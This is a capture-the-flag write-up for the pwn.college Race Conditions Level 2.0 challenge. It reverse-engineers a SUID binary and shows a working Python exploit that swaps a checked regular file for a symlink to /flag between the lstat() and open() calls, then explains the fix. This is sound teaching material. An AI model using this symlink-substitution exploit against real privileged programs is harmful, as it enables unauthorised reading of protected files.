# Stage 20: Race Conditions Level 2.0 — TOCTOU Symlink Substitution

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 2.0 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux x86-64 |
| **Binary** | `/challenge/babyrace_level2.0` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level2.0` is a SUID-root PIE ELF that accepts a pathname. It rejects paths containing `flag`, pauses, calls `lstat()` and rejects symbolic links, pauses again, then opens the same pathname and prints up to `0x100` bytes.

The weakness is the same TOCTOU gap as the earlier race challenges: the program validates a pathname, then resolves that pathname again when it opens the file. A regular file can pass the `lstat()` check and then be replaced with a symlink to `/flag` before `open()` runs.

Unlike Level 1.1's continuous atomic exchange, Level 2.0 provides two explicit `getchar()` pauses. That makes the substitution deterministic: let `lstat()` validate the regular file, swap the file during the second pause, then resume into `open()`.

| Attribute | Details |
|-----------|---------|
| Platform | pwn.college |
| Challenge | Race Conditions Level 2.0 |
| Binary | `/challenge/babyrace_level2.0` |
| Architecture | Linux x86-64 |
| Binary type | Dynamically linked PIE ELF |
| Privilege model | SUID executable |
| Vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Attack primitive | Symbolic-link substitution |
| Target file | `/flag` |

## Initial Reconnaissance

Inspect the challenge directory:

```bash
cd /challenge
ls -la
```

Check the binary:

```bash
file ./babyrace_level2.0
```

Observed binary properties:

- 64-bit ELF.
- x86-64 architecture.
- Dynamically linked.
- PIE executable.
- Not stripped.
- SUID executable.

Check the permissions:

```bash
ls -l ./babyrace_level2.0
```

The owner execute position contains an `s`, which marks the SUID bit. The binary is owned by root, so a normal run receives root's effective UID.

Inspect the relevant strings:

```bash
strings -a ./babyrace_level2.0 | grep -Ei 'flag|symlink|error|file|race|goodbye|pause'
```

Relevant output:

```text
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Error: failed to get file status!
Error: file is a symlink!
```

Those strings reveal the validation mechanism and the presence of interactive synchronization points.

## Reverse Engineering

The original challenge source was not captured for this run. The C snippets below are the behavior reconstructed from the disassembly, not a verbatim copy.

Disassemble `main()`:

```bash
objdump -d -M intel ./babyrace_level2.0 | grep -A220 -B15 '<main>'
```

The relevant execution sequence is:

```text
strstr(path, "flag")
        |
        v
Reject path containing "flag"
        |
        v
getchar()
        |
        v
lstat(path, &st)
        |
        v
Check file type
        |
        v
Reject symbolic links
        |
        v
getchar()
        |
        v
open(path, O_RDONLY)
        |
        v
read(fd, buffer, 0x100)
        |
        v
write(stdout, buffer, size)
```

### Important disassembly locations

| Address | Operation |
|---------|-----------|
| `0x13f3` | Calls `strstr()` |
| `0x142b` | First `getchar()` |
| `0x144b` | Calls `__lstat()` |
| `0x1471` | Loads and masks the file type |
| `0x149f` | Second `getchar()` |
| `0x14bf` | Calls `open()` |
| `0x14d7` | Calls `read()` |
| `0x14ee` | Calls `write()` |

The file-type check uses:

```asm
and eax, 0xf000
cmp eax, 0xa000
```

`0xa000` represents the symbolic-link file type (`S_IFLNK`). The binary therefore rejects a pathname that resolves to a symbolic link when `lstat()` executes.

## Vulnerability Analysis

The vulnerability is a classic TOCTOU condition.

**Time of check:**

```c
lstat(path, &st);
```

The program inspects the filesystem object without following symbolic links.

**Time of use:**

```c
fd = open(path, O_RDONLY);
```

The program later opens the pathname. It reuses the pathname string but does not verify that it still refers to the same filesystem object.

Combined, the gap is:

```c title="check-then-open.c" keys="1,3"
lstat(path, &st);

fd = open(path, O_RDONLY);
```

The exploitable interval is:

```text
lstat() completes
       |
       v
Filesystem object can change
       |
       v
open() resolves pathname again
```

A regular file can pass validation, then be replaced with a symbolic link before `open()`.

## Exploitation Strategy

The exploit uses the program's two synchronization points:

1. Start the SUID executable with a regular file.
2. Allow the first pause to continue.
3. The program performs `lstat()` and validates the regular file.
4. Wait for the second pause.
5. Replace the regular file with a symbolic link targeting `/flag`.
6. Resume execution.
7. The program calls `open()` on the modified pathname.
8. The privileged process reads the target file.

The pathname remains unchanged. Only the filesystem object associated with that pathname changes.

## Filesystem Layout

The exploit uses:

```text
/home/hacker/race/
    racefile
```

Initially:

```text
racefile -> regular file
```

After validation:

```text
racefile -> symbolic link -> /flag
```

The supplied pathname does not contain the substring `flag`, so the string-based validation does not reject it.

## Proof of Concept

The script below creates a regular file, starts the SUID binary behind a pseudo-terminal, waits for both pauses, swaps the file for a symlink, and resumes into `open()`.

```python title="exploit20.py" keys="20,23,55,62,63,66,68"
import os
import pty
import select
import time

binary = "/challenge/babyrace_level2.0"
directory = "/home/hacker/race"
target = directory + "/racefile"

os.makedirs(directory, exist_ok=True)

try:
    os.unlink(target)
except FileNotFoundError:
    pass

with open(target, "w") as f:
    f.write("NORMAL_FILE\n")

pid, fd = pty.fork()

if pid == 0:
    os.execv(binary, [binary, target])

def read_until(marker, timeout=5):
    data = b""
    end = time.time() + timeout

    while time.time() < end:
        ready, _, _ = select.select([fd], [], [], 0.1)

        if ready:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break

            if not chunk:
                break

            data += chunk

            if marker in data:
                return data

    return data

try:
    marker = b"Paused (press enter to continue)"

    # First pause: allow execution to reach lstat().
    output = read_until(marker)
    print(output.decode(errors="replace"), end="")

    os.write(fd, b"\n")

    # Second pause: lstat() has completed.
    output = read_until(marker)
    print(output.decode(errors="replace"), end="")

    # Replace the validated regular file.
    os.unlink(target)
    os.symlink("/flag", target)

    # Resume execution so open() follows the symlink.
    os.write(fd, b"\n")

    output = read_until(b"### Goodbye!", 5)
    print(output.decode(errors="replace"))

finally:
    try:
        os.waitpid(pid, 0)
    except ChildProcessError:
        pass

    try:
        os.unlink(target)
    except FileNotFoundError:
        pass
```

### Run it

```bash
python3 /tmp/exploit20.py
```

When the substitution succeeds, the program's output contains the flag followed by `### Goodbye!`. The exact flag is specific to the challenge instance.

## Exploit Implementation Details

### PTY process control

```python
pid, fd = pty.fork()
```

Creates a child process attached to a pseudo-terminal. This lets the exploit read the target's output and interact with its `getchar()` calls.

### Process execution

```python
os.execv(binary, [binary, target])
```

Executes the SUID binary with the attacker-controlled pathname.

### Output synchronization

```python
select.select([fd], [], [], 0.1)
```

Waits for readable terminal output instead of relying on arbitrary sleep durations.

### First synchronization point

```python
os.write(fd, b"\n")
```

Continues execution past the first pause, allowing the program to reach `lstat()` and validate the regular file.

### Filesystem substitution

```python
os.unlink(target)
os.symlink("/flag", target)
```

Removes the regular file and creates a symbolic link at the same pathname.

### Second synchronization point

```python
os.write(fd, b"\n")
```

Allows execution to continue into `open()`. This is the critical exploitation step: the pathname is now a symlink, and the privileged process follows it.

## Why the Exploit Works

The program validates the object at one point in time but opens the pathname at a later point. The exploit changes the filesystem entry between those operations.

The relevant distinction is:

- `lstat()` examines the symbolic link itself rather than following it.
- `open()` normally follows symbolic links.
- The pathname is resolved again when `open()` executes.
- The program therefore checks one object and can subsequently open another.

This is the fundamental TOCTOU weakness.

## Why the Timing Window Matters

Race-condition exploitation normally depends on scheduling and filesystem operation timing. A smaller interval between validation and use generally makes exploitation less reliable because the attacker has less time to replace the filesystem object.

This challenge provides explicit synchronization points, so the exploit can coordinate the substitution instead of relying entirely on CPU scheduling. The PoC uses the challenge's pauses; it is not a demonstration of winning an unsynchronized high-speed race.

## How to Fix It

The primary fix is to avoid validating a pathname and then independently reopening it. A safer approach is:

1. Open the file first.
2. Use `O_NOFOLLOW` to reject a final-component symbolic link.
3. Validate the opened file descriptor using `fstat()`.
4. Read from that same file descriptor.

Conceptually:

```c title="safe-open-level-2-0.c" keys="1,8,13"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0)
    return -1;

struct stat st;

if (fstat(fd, &st) < 0) {
    close(fd);
    return -1;
}

if (!S_ISREG(st.st_mode)) {
    close(fd);
    return -1;
}

/* Read from this same validated descriptor. */
```

Additional protections include:

- Use `openat()` or `openat2()` with appropriate resolution restrictions.
- Avoid unnecessary SUID privileges.
- Do not rely on `lstat()` followed by `open()` for security-sensitive validation.
- Keep file access tied to a validated file descriptor.

## Key Technical Takeaways

1. A pathname is not a stable reference to a filesystem object.
2. `lstat()` and `open()` perform separate pathname resolutions.
3. Symbolic-link rejection alone does not prevent TOCTOU vulnerabilities.
4. Interactive synchronization can make a race deterministic.
5. File descriptors provide a stable reference to an already-opened object.
6. Privileged filesystem operations require careful handling of attacker-controlled paths.

## Conclusion

This challenge demonstrates how a privileged Linux executable can become vulnerable when it separates filesystem validation from file access.

By reverse-engineering the binary, identifying both synchronization points, and coordinating a symbolic-link substitution, the exploit targets the gap between `lstat()` and `open()`.

| Field | Value |
|-------|-------|
| Challenge | pwn.college — Race Conditions Level 2.0 |
| Vulnerability | TOCTOU |
| Exploit primitive | Symlink substitution |
| Target | `/flag` |
